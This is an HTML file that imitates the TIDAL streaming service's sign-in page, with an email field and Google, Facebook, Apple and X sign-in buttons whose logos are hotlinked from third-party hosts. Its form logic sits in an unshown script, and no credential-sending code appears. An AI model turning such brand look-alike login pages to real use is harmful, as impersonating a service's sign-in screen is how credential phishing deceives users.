<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TIDAL - Sign up or log in</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <img src="https://belcantodesign.com/home/wp-content/uploads/2019/06/tidal-logo-wht-part-page.png" alt="Tidal Logo" class="logo">
            <h1>Sign up or log in</h1>
            <form id="loginForm">
                <div class="form-group">
                    <label for="email">Email or username</label>
                    <input type="text" id="email" name="email" placeholder="Email or username" required>
                </div>
                <button type="submit" class="btn btn-primary">Continue</button>
            </form>
            <div class="separator">or</div>
            <button class="btn btn-secondary"><img src="https://www.pngarts.com/files/11/Web-Google-Logo-PNG-High-Quality-Image.png" alt="Google" class="icon"> Continue with Google</button>
            <button class="btn btn-secondary"><img src="https://clipart.info/images/ccovers/1509135360facebook-logo-png-white.png" alt="Facebook" class="icon"> Continue with Facebook</button>
            <button class="btn btn-secondary"><img src="https://cdn.freebiesupply.com/logos/thumbs/2x/apple-logo.png" alt="Apple" class="icon"> Continue with Apple</button>
            <button class="btn btn-secondary"><img src="https://img.freepik.com/premium-photo/twitter-logo-icon-illustration-vector_895118-5886.jpg?size=338&ext=jpg&ga=GA1.1.2008272138.1727740800&semt=ais_hybrid" alt="X" class="icon"> Continue with X</button>
        </div>
    </div>
    <script src="scripts.js"></script>
</body>
</html>
